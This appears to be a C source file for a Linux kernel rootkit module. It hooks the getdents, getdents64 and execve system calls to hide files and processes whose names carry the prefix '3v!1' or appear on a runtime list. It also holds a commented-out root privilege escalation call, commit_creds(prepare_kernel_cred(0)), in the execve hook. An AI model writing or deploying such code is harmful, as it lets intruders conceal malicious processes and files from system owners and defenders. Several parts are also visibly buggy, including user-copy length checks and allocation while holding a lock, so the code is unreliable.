#include "hide.h"

/* hide/show directory entries */

static char** dynamic_processes_to_hide;
static int arrayListSize;
static int maxArrayListSize;
static char *hide__prefix = "3v!1";
static struct sctm *hide__sctm = NULL;
static struct sctm_hook hide__hooks[3];
static asmlinkage int (*original_getdents)(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count);
static asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

static int addProcessToHide(char* processName);
static int deleteProcessToHide(char* processName);

/* hide a directory entry */
int hide(const char __user *path) {
  char *_path;
  int result;
  char* tempPath;
  
  if (path == NULL)
    return EFAULT;
  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);
  printk("here\n");
  if (IS_ERR_OR_NULL(_path))
    return ENOMEM;
  result = strncpy_from_user(_path, path, sizeof(_path));
  printk("here\n");
  if (result) {
    kfree(_path);
    return result < 0 ? -result : result;
  }
  printk("here\n");
  tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
  if(IS_ERR_OR_NULL(tempPath)){
    kfree(_path);
    return ENOMEM;
  }
  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
  //      printk("%s",tempPath);
  result = addProcessToHide(tempPath);
  kfree(_path);
  if(result == -ENOMEM)
    return ENOMEM;
  return 0;
}

int hide_exit(void) {
  int i;
  int retval;
  int _retval;
  
  if (hide__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(hide__sctm))
    return -EINVAL;
  retval = 0;
  
  /* unhook */
  
  for (i = 0; i < sizeof(hide__hooks) / sizeof(hide__hooks[i]); i++) {
    _retval = sctm_unhook(hide__sctm, &hide__hooks[i]);
    
    if (!retval
        && _retval)
      retval = _retval;
  }
  
  for(i = 0; i < maxArrayListSize/sizeof(char*);i++){
    kfree(dynamic_processes_to_hide[i]);
  }
  kfree(dynamic_processes_to_hide);
  return retval;
}

int hide_init(struct sctm *sctm) {
  int i;
  int retval;
  
  if (!IS_ERR_OR_NULL(hide__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EINVAL;
  hide__sctm = sctm;
  
  /* hook calls */
  
  hide__hooks[0] = (struct sctm_hook) {
    .call = __NR_getdents,
    .hook = (sctm_syscall_handler_t) &new_getdents,
  };
  hide__hooks[1] = (struct sctm_hook) {
    .call = __NR_getdents64,
    .hook = (sctm_syscall_handler_t) &new_getdents
  };
  hide__hooks[2] = (struct sctm_hook) {
    .call = __NR_execve,
    .hook = (sctm_syscall_handler_t) &new_execve
  };
  
  for (i = 0; i < sizeof(hide__hooks) / sizeof(hide__hooks[0]); i++) {
    retval = sctm_hook(hide__sctm, &hide__hooks[i]);
    
    if (retval) {
      for (; i >= 0; i--)
        sctm_unhook(hide__sctm, &hide__hooks[i]); /* ignore failure */
      return retval;
    }
  }
  original_getdents = (asmlinkage int (*)(unsigned int,struct linux_dirent*, unsigned int)) hide__hooks[0].original;
  original_execve = (asmlinkage int (*)(const char *, char *const [], char *const [])) hide__hooks[2].original;
  
  dynamic_processes_to_hide = kcalloc(10,sizeof(char*),GFP_KERNEL);//create the array list;
  if(IS_ERR_OR_NULL(dynamic_processes_to_hide)){
    maxArrayListSize = -1;
    arrayListSize = -1;
  }
  else{
    maxArrayListSize = 10;
    arrayListSize = 0;
    }
    /*char* string = kcalloc(5,1,GFP_KERNEL);
    char* string2 = kcalloc(5,1,GFP_KERNEL);
    strcpy(string,"bash");
    strcpy(string2,"ps");
    addProcessToHide(string);
    addProcessToHide(string2);*/
    //printk("Syscall rename number: %d",maxArrayListSize);
    return 0;
  return 0;
}

/* show a directory entry */
int show(const char __user *path) {
    char *_path;
  int result;
  char* tempPath;
  
  if (path == NULL)
    return EFAULT;
  _path = kcalloc(1, PATH_MAX, GFP_KERNEL);

  if (IS_ERR_OR_NULL(_path))
    return ENOMEM;
  result = strncpy_from_user(_path, path, sizeof(_path));
  
  if (result) {
    kfree(_path);
    return result < 0 ? -result : result;
  }
  tempPath = kcalloc(strlen(_path) - strlen(hide__prefix),1,GFP_KERNEL);
  if(IS_ERR_OR_NULL(tempPath)){
    kfree(_path);
    return ENOMEM;
  }
  strncpy_from_user(tempPath,path+strlen(hide__prefix), strlen(_path) - strlen(hide__prefix));
  //      printk("%s",tempPath);
  result = deleteProcessToHide(tempPath);
  kfree(_path);
  if(result == -ENOMEM)
    return ENOMEM;
  return 0;
}

//Add the process name to the arraylist
//return 0 if successful; -ENOMEM if array failed to be expanded or allocated at startup;
//NOTE THE STRING PASSED INTO THIS MUST BE A STRING COPIED TO THE KERNEL SPACE THROUGH KMALLOC THEN MEMCPY
static int addProcessToHide(char* processName){
    int i;
    char** tempArray;
    if(arrayListSize == -1){
        return -ENOMEM;
    }
    if(arrayListSize >= maxArrayListSize){
        tempArray = kcalloc(2*maxArrayListSize,sizeof(char*),GFP_KERNEL);
        if(!tempArray){
            return -ENOMEM;
        }
        memcpy(tempArray,dynamic_processes_to_hide,arrayListSize*sizeof(char*));
        kfree(dynamic_processes_to_hide);
        dynamic_processes_to_hide = tempArray;
        maxArrayListSize = maxArrayListSize*2;
    }
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] == NULL){
            dynamic_processes_to_hide[i] = processName;
            arrayListSize++;
            break;
        }
    }
    return 0;
}

//Remove the process name from the arraylist
//return 0 if successful; successful if removed or item does not exist
static int deleteProcessToHide(char* processName){
    int i;
    if(arrayListSize == 0){
        return 0;
    }
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] != NULL && strcmp(dynamic_processes_to_hide[i],processName)==0){
            kfree(dynamic_processes_to_hide[i]);
            arrayListSize--;
            dynamic_processes_to_hide[i] = NULL;
        }
    }
    return 0;
}

//return array list size so the user space program can determine the size of the buffer to send
static int getArrayListSize(void){
    return arrayListSize;
}

//Fill in the provided buffer with the strings of hidden process names; count is the size of the buffer
//Returns -ENOMEM if buffer does not exist or the buffer cannot fit all entries; 0 otherwise
static int getHiddenProcesses(char** buffer,int count){
    int i;
    int current_count;
    if(!buffer || count < arrayListSize){
        return -ENOMEM;
    }
    current_count = 0;
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] != NULL){
            strcpy(buffer[current_count],dynamic_processes_to_hide[i]);
            current_count++;
        }
    }
    return 0;
}

static asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count){
    int bytesread = original_getdents(fd,dirp,count);
    int newBytes = bytesread;
    char *bufferPointer;
    char *name;
    int psbytes;
    struct pid *process;
    struct task_struct* process_struct;
    int pid;
    char *process_name;
    int removedEntrySize;
    int copySize;
    void *alteredBuffer;
    bool flag;
    int i;
    int bytes;
    struct files_struct *current_files;
    struct file *current_directory;
    struct path *directory_path;
    current_files = current->files;// get current proccess file table
    spin_lock(&current_files->file_lock);//hold a lock on current files
    current_directory = fcheck_files(current_files,fd);//check if the directory passed into getdents exists
    if(current_directory){
        directory_path = &current_directory->f_path;//get the path structure of the directory
        path_get(directory_path); //increase the reference count so we do not lose this structure randomly
        name = (char*)kmalloc(256,GFP_KERNEL);//allocate memory for the directory name
        bufferPointer = d_path(directory_path,name,256);
        //printk("%s",bufferPointer);
        path_put(directory_path);//free the reference
        if(strcmp(bufferPointer,"/proc") == 0){//check if we are in /proc and perform hiding of processes
            //printk("Wow! we detected a enter into /proc");
            //this part is the same exact thing as below except now we will grab the director name which
                        //is the pid and then perform a pid lookup to see if its a directory we want to hide
            for(psbytes = 0; psbytes < newBytes;){
                linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + psbytes);
                //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
                pid = 0;
                kstrtoint(d->d_name,10,&pid);
                //printk("%d",pid);
                if(pid != -EINVAL && pid != 0){
                    process = find_get_pid(pid);
                    if(process == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    process_struct = pid_task(process,PIDTYPE_PID);
                    if(process_struct == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    //printk("%s",process_struct->comm);
                    process_name =  process_struct->comm;

                    flag = false;
                    for(i = 0; i < maxArrayListSize; i++){//check if the process is one of the listed override processes
                        if(dynamic_processes_to_hide[i] != NULL && strncmp(process_name,dynamic_processes_to_hide[i],15) == 0){
                            //printk("Match found for process to hide. Hiding from dirent entries.");
                            alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                            removedEntrySize = d->d_reclen;
                            copySize = newBytes - psbytes - removedEntrySize;
                            memcpy(d,alteredBuffer,copySize);
                            newBytes -= removedEntrySize;
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        continue;
                    }
                    if(strlen(process_name) < strlen(hide__prefix)){//check if the name can even fit the prefix
                        psbytes += d->d_reclen;
                        continue;
                    }
                    if(strncmp(process_name, hide__prefix,strlen(hide__prefix))==0){//check if the process name has the prefix
                        //printk("Match found for process to hide. Hiding from dirent entries.");
                        alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                        removedEntrySize = d->d_reclen;
                        copySize = newBytes - psbytes - removedEntrySize;
                        memcpy(d,alteredBuffer,copySize);
                        newBytes -= removedEntrySize;
                        continue;
                    }
                }

                psbytes += d->d_reclen;
            }
            spin_unlock(&current_files->file_lock);
            kfree(name);
            return newBytes;
        }
        kfree(name);
    }
    spin_unlock(&current_files->file_lock);//release the lock
    //printk("Current fd path:%p\n", current->files->fd_array[fd]->f_path/*.dentry->d_name.name*/);
    /*struct path* inodeInfoBuffer = (struct path*)kcalloc(1,sizeof(struct path),GFP_KERNEL);
    int errormessage = kern_path("/", LOOKUP_FOLLOW, inodeInfoBuffer);
    printk("error: %d",errormessage);
    printk("filesize = %d",inodeInfoBuffer->dentry->d_inode->i_size);   inode information
    printk("mode = %lu",inodeInfoBuffer->dentry->d_inode->i_mode);
    printk("sizeof modefield = %lu",sizeof(umode_t));*/


    //printk("succesfully executed getdents with %d bytes read, filename %s \n",bytesread, dirp->d_name);
    for(bytes = 0; bytes < newBytes;){
        linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + bytes);
        //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
        //printk("inode number: %lu", d->d_ino);
        if(strlen(d->d_name) >= strlen(hide__prefix)){
            if(strncmp(d->d_name, hide__prefix,strlen(hide__prefix)) == 0){
                //printk("Match found for prefix. Hiding from dirent entries.");
                alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
                removedEntrySize = d->d_reclen;
                copySize = newBytes - bytes - removedEntrySize;
                memcpy(d,alteredBuffer,copySize);
                newBytes -= removedEntrySize;
                continue;
            }
        }
        bytes += d->d_reclen;
    }
    //kfree(inodeInfoBuffer);
    //printk("hello world its getdents function");
    return newBytes;
}

static asmlinkage int new_execve(const char *pathname, char *const argv[], char *const envp[]){
    //commit_creds(prepare_kernel_cred(0));
    //printk("Program name hooked: %s",pathname);
    return original_execve(pathname,argv,envp);

}

